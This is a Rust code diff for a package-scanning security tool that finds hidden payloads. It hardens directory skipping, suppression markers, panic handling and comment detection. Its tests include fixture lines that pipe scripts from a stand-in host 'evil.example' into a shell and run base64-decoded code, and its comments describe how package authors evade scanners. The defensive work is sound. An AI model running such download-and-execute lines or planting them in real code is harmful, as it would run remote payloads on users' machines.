@@ -32,6 +32,10 @@ const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;
 
 /// Finding name for critical files larger than `MAX_SCAN_BYTES`.
 pub const OVERSIZED_FINDING: &str = "Oversized File (partially scanned)";
+/// A file whose analysis panicked. Reported, never silently dropped.
+pub const SCAN_ERROR_FINDING: &str = "Scanner Error (file not analysed)";
+/// A file in a third-party package that could not be opened.
+pub const UNREADABLE_FINDING: &str = "Unreadable File (not scanned)";
 
 /// Rule names the correlation pass keys on (see `correlate.rs`).
 pub const LOCAL_SERVER: &str = "Local Network Server";
@@ -192,40 +196,58 @@ pub fn get_extension(filename: &str) -> &str {
     ""
 }
 
+/// Directories not worth scanning. In the operator's own checkout that is
+/// build output and virtualenvs; in someone else's code only the clone's own
+/// `.git`. A package author can name a payload directory `lib/target/` or
+/// `__pycache__/`, and those used to be skipped at any depth.
+/// `node_modules` is always scanned: in a VSIX/CRX it is shipped, executed
+/// code and the obvious place to hide a payload.
+pub fn skip_dir(e: &walkdir::DirEntry, own_tree: bool) -> bool {
+    if !e.file_type().is_dir() {
+        return false;
+    }
+    let name = e.file_name().to_string_lossy();
+    if own_tree {
+        [
+            ".git",
+            "__pycache__",
+            ".tox",
+            ".eggs",
+            "target",
+            "venv",
+            ".venv",
+        ]
+        .contains(&name.as_ref())
+    } else {
+        e.depth() == 1 && name == ".git"
+    }
+}
+
 /// Scan directory, optionally restricted to `changed` repo-relative paths
-/// (used by `--changed-only` for PR scans).
+/// (used by `--changed-only` for PR scans). `own_tree`: the operator's own
+/// checkout, scanned in place. Only there are build directories skipped and
+/// inline `kalascan:ignore` markers honoured; in a downloaded package they
+/// are the author's way to opt out of the scan.
 pub fn scan_directory_filtered<P: AsRef<Path>>(
     dir: P,
     custom_yara_dir: Option<&Path>,
     extra_rules: &[Rule],
     changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
+    own_tree: bool,
 ) -> (usize, usize, Vec<RuleMatch>) {
     let mut rules = build_rules();
     rules.extend_from_slice(extra_rules);
     let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
-    let mut matches = Vec::new();
     let mut total_files = 0usize;
     let mut targets: Vec<Target> = Vec::new();
     let mut scanned_files = 0usize;
 
-    // `node_modules` is scanned: in a VSIX/CRX it is shipped, executed code
-    // and the obvious place to hide a payload.
-    let skip_dirs: &[&str] = &[
-        ".git",
-        "__pycache__",
-        ".tox",
-        ".eggs",
-        "target",
-        "venv",
-        ".venv",
-    ];
-
     // Phase 1: collect candidate files (same order as the old single pass,
     // so results stay deterministic).
-    for entry in WalkDir::new(dir.as_ref()).into_iter().filter_entry(|e| {
-        let name = e.file_name().to_string_lossy();
-        !e.path().is_dir() || !skip_dirs.contains(&name.as_ref())
-    }) {
+    for entry in WalkDir::new(dir.as_ref())
+        .into_iter()
+        .filter_entry(|e| !skip_dir(e, own_tree))
+    {
         let entry = match entry {
             Ok(e) => e,
             Err(_) => continue,
@@ -267,22 +289,42 @@ pub fn scan_directory_filtered<P: AsRef<Path>>(
         });
     }
 
-    // Phase 2: scan candidate files in parallel (chunks preserve order,
-    // so concatenating the chunk results equals the sequential output).
+    // Phase 2: scan in parallel. Workers take the next file from a shared
+    // counter: fixed chunks put a `dist/` of large bundles on one or two
+    // workers while the rest sat idle. Results go back into walk order, so
+    // the output is the same as a sequential pass.
     let workers = std::thread::available_parallelism()
         .map(|n| n.get())
         .unwrap_or(4)
-        .min(16);
-    let chunk_size = targets.len().div_ceil(workers).max(1);
-    std::thread::scope(|scope| {
-        let handles: Vec<_> = targets
-            .chunks(chunk_size)
-            .map(|chunk| scope.spawn(|| scan_files(chunk, &rules, &yara_engine)))
+        .clamp(1, 16)
+        .min(targets.len().max(1));
+    let next = std::sync::atomic::AtomicUsize::new(0);
+    let mut per_file: Vec<(usize, Vec<RuleMatch>)> = std::thread::scope(|scope| {
+        let handles: Vec<_> = (0..workers)
+            .map(|_| {
+                scope.spawn(|| {
+                    let mut yara = yara_engine.scanner();
+                    let mut done = Vec::new();
+                    loop {
+                        let i = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                        let Some(target) = targets.get(i) else {
+                            break;
+                        };
+                        done.push((i, scan_target(target, &rules, yara.as_mut(), own_tree)));
+                    }
+                    done
+                })
+            })
             .collect();
-        for handle in handles {
-            matches.extend(handle.join().unwrap_or_default());
-        }
+        // scan_target contains per-file panics, so a worker panic is a bug in
+        // this loop: fail the scan rather than report a partial result as clean.
+        handles
+            .into_iter()
+            .flat_map(|h| h.join().expect("scan worker panicked"))
+            .collect()
     });
+    per_file.sort_unstable_by_key(|(i, _)| *i);
+    let matches = per_file.into_iter().flat_map(|(_, m)| m).collect();
 
     (total_files, scanned_files, matches)
 }
@@ -305,122 +347,177 @@ fn read_capped(path: &Path) -> Option<(Vec<u8>, u64)> {
     Some((buf, size))
 }
 
-/// Scan one chunk of targets.
-fn scan_files(
-    targets: &[Target],
+/// Scan one file. A panic in the analysis becomes a finding on that file:
+/// it used to drop every finding of every file in the worker's chunk, and a
+/// non-ASCII comment near a payload was enough to trigger it.
+fn scan_target(
+    target: &Target,
     rules: &[Rule],
-    yara_engine: &crate::yara_engine::YaraEngine,
+    yara: Option<&mut yara_x::Scanner<'_>>,
+    own_tree: bool,
 ) -> Vec<RuleMatch> {
-    let mut matches = Vec::new();
-    for Target {
+    let finding = |name: &str, severity: &str, context: String| RuleMatch {
+        file_path: target.rel_path.clone(),
+        line_number: 1,
+        matched_pattern: name.to_string(),
+        severity: severity.to_string(),
+        context,
+    };
+    let Some((bytes, size)) = read_capped(&target.abs_path) else {
+        // Mode-0000 tar entries unpack unreadable; npm re-modes them on
+        // install, so the victim runs a file the scan never saw.
+        return if own_tree {
+            Vec::new()
+        } else {
+            vec![finding(
+                UNREADABLE_FINDING,
+                "medium",
+                "Could not read this file; it was not scanned".to_string(),
+            )]
+        };
+    };
+    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        scan_bytes(target, &bytes, size, rules, yara, own_tree)
+    }))
+    .unwrap_or_else(|panic| {
+        let why = panic
+            .downcast_ref::<String>()
+            .map(String::as_str)
+            .or_else(|| panic.downcast_ref::<&str>().copied())
+            .unwrap_or("panic");
+        vec![finding(
+            SCAN_ERROR_FINDING,
+            "high",
+            format!(
+                "Analysis of this file failed and it was not scanned: {}",
+                why
+            ),
+        )]
+    })
+}
+
+fn scan_bytes(
+    target: &Target,
+    bytes: &[u8],
+    size: u64,
+    rules: &[Rule],
+    yara: Option<&mut yara_x::Scanner<'_>>,
+    honor_markers: bool,
+) -> Vec<RuleMatch> {
+    let Target {
         rel_path,
         filename,
-        abs_path,
         critical,
-    } in targets
-    {
-        let Some((bytes, size)) = read_capped(abs_path) else {
-            continue;
-        };
+        ..
+    } = target;
+    // Raw bytes, not the lossy text: U+FFFD replacement changes what a
+    // binary signature sees.
+    let yara_hits = || {
+        yara.map(|s| crate::yara_engine::scan_with(s, rel_path, bytes))
+            .unwrap_or_default()
+    };
 
-        if !critical {
-            matches.extend(yara_engine.scan_data(rel_path, &bytes));
-            if crate::workflow::is_workflow(rel_path) {
-                matches.extend(crate::workflow::scan(
-                    rel_path,
-                    &String::from_utf8_lossy(&bytes),
-                ));
-            }
+    if !critical {
+        let mut out = yara_hits();
+        if crate::workflow::is_workflow(rel_path) {
+            out.extend(crate::workflow::scan(
+                rel_path,
+                &String::from_utf8_lossy(bytes),
+            ));
+        }
+        return out;
+    }
+
+    // Lossy: one invalid byte used to make read_to_string fail and skip the file.
+    let content = String::from_utf8_lossy(bytes);
+
+    // Whole-file inline suppression marker
+    if honor_markers && content.contains("kalascan:ignore-file") {
+        return Vec::new();
+    }
+
+    let mut out = Vec::new();
+    if size > MAX_SCAN_BYTES {
+        out.push(RuleMatch {
+            file_path: rel_path.clone(),
+            line_number: 1,
+            matched_pattern: OVERSIZED_FINDING.to_string(),
+            severity: "low".to_string(),
+            context: format!(
+                "File is {} bytes; only the first {} MiB were scanned",
+                size,
+                MAX_SCAN_BYTES / (1024 * 1024)
+            ),
+        });
+    }
+
+    let mut matches = Vec::new();
+    // Byte offset per finding of this file, for chain proximity checks.
+    let mut offsets: Vec<usize> = Vec::new();
+    let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
+    // 0-based line index and its start offset, by binary search: a minified
+    // bundle is one 4 MB line, and scanning back to its start per match made
+    // such files ~10x slower than the same code with line breaks.
+    let line_of = |pos: usize| newlines.partition_point(|&i| i < pos);
+    let line_start = |idx: usize| if idx == 0 { 0 } else { newlines[idx - 1] + 1 };
+    let ignored_lines: std::collections::HashSet<usize> = if honor_markers {
+        content
+            .match_indices("kalascan:ignore")
+            .map(|(pos, _)| line_of(pos))
+            .collect()
+    } else {
+        std::collections::HashSet::new()
+    };
+    let ext = get_extension(filename);
+
+    for rule in rules {
+        if !rule.applies_to(ext, filename) {
             continue;
         }
 
-        // Lossy: one invalid byte used to make read_to_string fail and skip the file.
-        let content = String::from_utf8_lossy(&bytes);
-
-        // Whole-file inline suppression marker
-        if content.contains("kalascan:ignore-file") {
-            continue;
-        }
-
-        if size > MAX_SCAN_BYTES {
-            matches.push(RuleMatch {
-                file_path: rel_path.clone(),
-                line_number: 1,
-                matched_pattern: OVERSIZED_FINDING.to_string(),
-                severity: "low".to_string(),
-                context: format!(
-                    "File is {} bytes; only the first {} MiB were scanned",
-                    size,
-                    MAX_SCAN_BYTES / (1024 * 1024)
-                ),
-            });
-        }
-
-        let file_start = matches.len();
-        // Byte offset per finding of this file, for chain proximity checks.
-        let mut offsets: Vec<usize> = Vec::new();
-        let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
-        let ext = get_extension(filename);
-
-        for rule in rules {
-            if !rule.applies_to(ext, filename) {
+        for cap in rule.pattern.find_iter(&content) {
+            let line = line_of(cap.start());
+            if ignored_lines.contains(&line)
+                || is_comment_only_line(&content, line_start(line), cap.start())
+            {
                 continue;
             }
-
-            for cap in rule.pattern.find_iter(&content) {
-                if line_has_ignore_marker(&content, cap.start())
-                    || is_comment_only_line(&content, cap.start())
-                {
-                    continue;
-                }
-                let is_ip_rule = rule.name == "Hardcoded IP Address" || rule.name == IP_URL;
-                let ip_text = cap.as_str().rsplit('/').next().unwrap_or_default();
-                if is_ip_rule && !is_public_ipv4(ip_text) {
-                    continue;
-                }
-                let is_download_rule = rule.name == REMOTE_BINARY || rule.name == DOWNLOAD_CRADLE;
-                if is_download_rule && is_vendor_download(cap.as_str()) {
-                    continue;
-                }
-                let context = get_context(&content, cap.start(), cap.end());
-                offsets.push(cap.start());
-
-                matches.push(RuleMatch {
-                    file_path: rel_path.clone(),
-                    line_number: newlines.partition_point(|&i| i < cap.start()) + 1,
-                    matched_pattern: rule.name.to_string(),
-                    severity: rule.severity.to_string(),
-                    context,
-                });
+            let is_ip_rule = rule.name == "Hardcoded IP Address" || rule.name == IP_URL;
+            let ip_text = cap.as_str().rsplit('/').next().unwrap_or_default();
+            if is_ip_rule && !is_public_ipv4(ip_text) {
+                continue;
             }
+            let is_download_rule = rule.name == REMOTE_BINARY || rule.name == DOWNLOAD_CRADLE;
+            if is_download_rule && is_vendor_download(cap.as_str()) {
+                continue;
+            }
+            offsets.push(cap.start());
+            matches.push(RuleMatch {
+                file_path: rel_path.clone(),
+                line_number: line + 1,
+                matched_pattern: rule.name.to_string(),
+                severity: rule.severity.to_string(),
+                context: get_context(&content, cap.start(), cap.end()),
+            });
         }
-
-        // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs.
-        // Guarded: a panic here must not drop the other files in this chunk
-        // (a UTF-8 slicing bug used to do exactly that).
-        let entropy_matches = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-            crate::entropy::scan_advanced_obfuscation(rel_path, &content)
-        }))
-        .unwrap_or_default();
-        matches.extend(entropy_matches);
-
-        // YARA rules matching
-        let yara_matches = yara_engine.scan_data(rel_path, content.as_bytes());
-        matches.extend(yara_matches);
-
-        // Entropy / YARA hits only know their line: use the line start.
-        let line_start = |line: usize| match line {
-            0 | 1 => 0,
-            n => newlines.get(n - 2).map_or(0, |&i| i + 1),
-        };
-        for m in &matches[file_start + offsets.len()..] {
-            offsets.push(line_start(m.line_number));
-        }
-        let chains =
-            crate::correlate::correlate_file(rel_path, &content, &matches[file_start..], &offsets);
-        matches.extend(chains);
     }
-    matches
+
+    // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs.
+    matches.extend(crate::entropy::scan_advanced_obfuscation(
+        rel_path, &content,
+    ));
+    matches.extend(yara_hits());
+
+    // Entropy / YARA hits only know their line: use the line start.
+    for m in &matches[offsets.len()..] {
+        offsets.push(line_start(
+            m.line_number.saturating_sub(1).min(newlines.len()),
+        ));
+    }
+    let chains = crate::correlate::correlate_file(rel_path, &content, &matches, &offsets);
+    out.extend(matches);
+    out.extend(chains);
+    out
 }
 
 /// Official vendor download / installer hosts: Playwright fetching Chrome
@@ -484,65 +581,88 @@ fn is_public_ipv4(text: &str) -> bool {
     }
 }
 
-fn line_has_ignore_marker(content: &str, start: usize) -> bool {
-    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
-    let line_end = content[start..]
-        .find('\n')
-        .map(|i| start + i)
-        .unwrap_or(content.len());
-    content[line_start..line_end].contains("kalascan:ignore")
+/// Byte index at or below `i` that starts a char (std's version needs a
+/// newer toolchain than the README promises).
+pub(crate) fn floor_boundary(s: &str, i: usize) -> usize {
+    let mut i = i.min(s.len());
+    while !s.is_char_boundary(i) {
+        i -= 1;
+    }
+    i
 }
 
-/// True when the match sits inside a comment (`//`, `#`, `/* ... */`).
-/// Commented-out code is not executed; flagging it was pure noise.
-fn is_comment_only_line(content: &str, start: usize) -> bool {
-    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
+/// `s` cut to at most `max` bytes on a char boundary, with "..." when cut.
+pub(crate) fn truncate_on_char(s: &str, max: usize) -> String {
+    if s.len() <= max {
+        return s.to_string();
+    }
+    format!("{}...", &s[..floor_boundary(s, max)])
+}
+
+/// Text before a match that the block-comment checks look at. A minified
+/// bundle is one line: nobody comments code out there.
+const COMMENT_SCAN_LIMIT: usize = 1000;
+
+/// True when the match at `start` (on the line beginning at `line_start`)
+/// sits inside a comment (`//`, `#`, `/* ...`). Commented-out code is not
+/// executed; flagging it was pure noise.
+///
+/// A block comment counts only when the line opens with `/*`: any `/*`
+/// further along may be inside a string, and `var a="/*";eval(atob(...))`
+/// used to hide everything after it. Cost: code followed by a trailing
+/// `/* exec(x) */` on the same line is now reported.
+fn is_comment_only_line(content: &str, line_start: usize, start: usize) -> bool {
     let before = &content[line_start..start];
     let trimmed = before.trim_start();
     if trimmed.starts_with("//") || trimmed.starts_with('#') {
         return true;
     }
-    // JSDoc continuation ` * text`: only when the line above is a comment
-    // too, and nothing closed it before the match (` * x */ fetch(evil)`).
-    if (trimmed.starts_with("* ") || trimmed == "*") && !before.contains("*/") {
-        let prev = content[..line_start.saturating_sub(1)]
-            .rsplit('\n')
-            .next()
-            .unwrap_or_default()
-            .trim_start();
-        if (prev.starts_with("/*") || prev.starts_with('*')) && !prev.contains("*/") {
-            return true;
-        }
+    // A block closed before the match means code follows (` * x */ fetch(evil)`).
+    if before.len() > COMMENT_SCAN_LIMIT || before.contains("*/") {
+        return false;
     }
-    match (before.rfind("/*"), before.rfind("*/")) {
-        (Some(open), Some(close)) => open > close,
-        (Some(_), None) => true,
-        _ => false,
+    if trimmed.starts_with("/*") {
+        return true;
     }
+    // JSDoc continuation ` * text`: only when the line above is a comment too.
+    if line_start > 0 && (trimmed.starts_with("* ") || trimmed == "*") {
+        let lo = floor_boundary(content, line_start.saturating_sub(COMMENT_SCAN_LIMIT));
+        let above = &content[lo..line_start - 1];
+        // A line above longer than the window is code, not a comment.
+        let prev = match above.rfind('\n') {
+            Some(i) => Some(&above[i + 1..]),
+            None if lo == 0 => Some(above),
+            None => None,
+        };
+        return prev.is_some_and(|p| {
+            let p = p.trim_start();
+            (p.starts_with("/*") || p.starts_with('*')) && !p.contains("*/")
+        });
+    }
+    false
 }
 
-fn get_context(content: &str, start: usize, end: usize) -> String {
-    let before = content[..start]
-        .rsplit('\n')
-        .take(3)
-        .collect::<Vec<_>>()
-        .into_iter()
-        .rev()
-        .collect::<Vec<_>>()
-        .join("\n");
+/// Up to 3 lines either side of the match, from at most `CONTEXT_SPAN` bytes
+/// each way. The old version copied the whole line per match (4 MB on a
+/// bundle), often cut the match itself off, and sliced at byte 200 even
+/// inside a multi-byte char, which panicked.
+const CONTEXT_SPAN: usize = 80;
 
-    let matched = &content[start..end];
-    let after = content[end..]
-        .split('\n')
-        .take(3)
-        .collect::<Vec<_>>()
-        .join("\n");
+pub(crate) fn get_context(content: &str, start: usize, end: usize) -> String {
+    let lo = floor_boundary(content, start.saturating_sub(CONTEXT_SPAN));
+    let mut before: Vec<&str> = content[lo..start].rsplit('\n').take(3).collect();
+    before.reverse();
 
-    let mut ctx = format!("{}\n>>> {} <<<\n{}", before, matched, after);
-    if ctx.len() > 200 {
-        ctx = format!("{}...", &ctx[..200]);
-    }
-    ctx
+    let hi = floor_boundary(content, end.saturating_add(CONTEXT_SPAN));
+    let after: Vec<&str> = content[end..hi].split('\n').take(3).collect();
+
+    let ctx = format!(
+        "{}\n>>> {} <<<\n{}",
+        before.join("\n"),
+        &content[start..end],
+        after.join("\n")
+    );
+    truncate_on_char(&ctx, 200)
 }
 
 #[cfg(test)]
@@ -559,8 +679,9 @@ mod tests {
         .unwrap();
         std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();
 
-        let (total, scanned, mut first) = scan_directory_filtered(dir.path(), None, &[], None);
-        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None);
+        let (total, scanned, mut first) =
+            scan_directory_filtered(dir.path(), None, &[], None, true);
+        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None, true);
 
         let key = |m: &RuleMatch| {
             (
@@ -601,7 +722,7 @@ mod tests {
         )
         .unwrap();
 
-        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None);
+        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
         assert_eq!((total, scanned), (4, 2));
         assert!(!matches.iter().any(|m| m.file_path == "README.md"));
         let has = |file: &str, rule: &str| {
@@ -746,7 +867,7 @@ mod tests {
     fn test_exec_match_stays_on_its_line() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
-        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None);
+        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
         let m = matches
             .iter()
             .find(|m| m.matched_pattern == "exec() Usage")
@@ -764,24 +885,128 @@ mod tests {
         assert!(!is_critical_file("image.png"));
     }
 
+    fn comment_at(content: &str, pos: usize) -> bool {
+        let line_start = content[..pos].rfind('\n').map_or(0, |i| i + 1);
+        is_comment_only_line(content, line_start, pos)
+    }
+
     #[test]
     fn test_commented_out_code_is_ignored() {
         let content = "// exec(command, { name: \"X\" }, (err) => {});\n";
-        assert!(is_comment_only_line(content, 5)); // inside the comment
+        assert!(comment_at(content, 5)); // inside the comment
         let real = "exec(command, { name: \"X\" }, (err) => {});\n";
-        assert!(!is_comment_only_line(real, 3));
+        assert!(!comment_at(real, 3));
         let py = "# os.system('rm -rf /')\n";
-        assert!(is_comment_only_line(py, 4));
+        assert!(comment_at(py, 4));
+        let block = "/* exec(cmd) */\n";
+        assert!(comment_at(block, 3));
         // JSDoc continuation lines (ngrok's typings: `* // https://x.ngrok.io`).
         let doc = "/**\n * const url = await ngrok.connect(); // https://a.ngrok.io\n */";
-        assert!(is_comment_only_line(doc, doc.find("https").unwrap()));
+        assert!(comment_at(doc, doc.find("https").unwrap()));
         // Not a comment: the block closed before the match, or never opened.
         let closed = "/**\n * x */ fetch('https://a.ngrok.io')";
-        assert!(!is_comment_only_line(closed, closed.find("https").unwrap()));
+        assert!(!comment_at(closed, closed.find("https").unwrap()));
         let product = "/** doc */\n* fetch('https://a.ngrok.io')";
-        assert!(!is_comment_only_line(
-            product,
-            product.find("https").unwrap()
-        ));
+        assert!(!comment_at(product, product.find("https").unwrap()));
+        // A `/*` inside a string opens nothing.
+        let string = "var a=\"/*\";eval(atob(\"ZXZpbA==\"));";
+        assert!(!comment_at(string, string.find("eval").unwrap()));
+    }
+
+    fn scan(dir: &std::path::Path, own_tree: bool) -> Vec<RuleMatch> {
+        scan_directory_filtered(dir, None, &[], None, own_tree).2
+    }
+
+    fn has(matches: &[RuleMatch], file: &str, rule: &str) -> bool {
+        matches
+            .iter()
+            .any(|m| m.file_path == file && m.matched_pattern == rule)
+    }
+
+    #[test]
+    fn multibyte_text_near_a_match_neither_panics_nor_hides_files() {
+        let dir = tempfile::tempdir().unwrap();
+        // Byte 200 of the context used to fall inside `中` and panic, and the
+        // panic dropped every finding of the worker's chunk.
+        let src = format!(
+            "// {}中中中中中\nconst {{ execSync }} = require(\"child_process\"); execSync(\"curl -fsSL https://evil.example/x.sh | bash\");\n",
+            "a".repeat(196)
+        );
+        std::fs::write(dir.path().join("a.js"), src).unwrap();
+        let matches = scan(dir.path(), false);
+        assert!(has(&matches, "a.js", DOWNLOAD_CRADLE));
+        assert!(!matches
+            .iter()
+            .any(|m| m.matched_pattern == SCAN_ERROR_FINDING));
+
+        let ctx = get_context("中".repeat(100).as_str(), 150, 153);
+        assert!(ctx.contains(">>> 中 <<<"));
+    }
+
+    #[test]
+    fn context_shows_the_match_on_a_minified_line() {
+        let line = format!("{}eval(x){}", "a=1;".repeat(10_000), "b=2;".repeat(10_000));
+        let at = line.find("eval").unwrap();
+        let ctx = get_context(&line, at, at + 5);
+        assert!(ctx.contains(">>> eval( <<<"), "{}", ctx);
+        assert!(ctx.len() <= 203);
+    }
+
+    #[test]
+    fn build_dirs_and_markers_are_skipped_only_in_own_tree() {
+        let dir = tempfile::tempdir().unwrap();
+        let target = dir.path().join("lib/target");
+        std::fs::create_dir_all(&target).unwrap();
+        std::fs::write(target.join("payload.js"), "eval(atob(p));\n").unwrap();
+        std::fs::write(
+            dir.path().join("muted.js"),
+            "/* kalascan:ignore-file */\neval(atob(p));\n",
+        )
+        .unwrap();
+        std::fs::write(dir.path().join("line.js"), "eval(p); // kalascan:ignore\n").unwrap();
+
+        let package = scan(dir.path(), false);
+        for file in ["lib/target/payload.js", "muted.js", "line.js"] {
+            assert!(has(&package, file, "eval() Usage"), "{} not scanned", file);
+        }
+        let own = scan(dir.path(), true);
+        assert!(own.is_empty(), "{:?}", own);
+    }
+
+    #[test]
+    fn rules_starting_at_a_newline_keep_their_own_line() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("s.py"),
+            "# decode helper\nexec(b64decode(p))\n# install\ncurl https://evil.example/a.sh | sh\n",
+        )
+        .unwrap();
+        let matches = scan(dir.path(), false);
+        let line = |rule: &str| {
+            matches
+                .iter()
+                .find(|m| m.matched_pattern == rule)
+                .map(|m| m.line_number)
+        };
+        assert_eq!(line("b64decode + exec Chain"), Some(2));
+        assert_eq!(line(DOWNLOAD_CRADLE), Some(4));
+    }
+
+    #[test]
+    fn work_is_spread_and_output_stays_in_walk_order() {
+        let dir = tempfile::tempdir().unwrap();
+        for i in 0..40 {
+            std::fs::write(dir.path().join(format!("f{:02}.js", i)), "eval(x)\n").unwrap();
+        }
+        let files: Vec<String> = scan(dir.path(), true)
+            .into_iter()
+            .map(|m| m.file_path)
+            .collect();
+        let mut sorted = files.clone();
+        sorted.sort();
+        assert_eq!(files.len(), 40);
+        // WalkDir order is directory order; check every file appears once.
+        sorted.dedup();
+        assert_eq!(sorted.len(), 40);
     }
 }
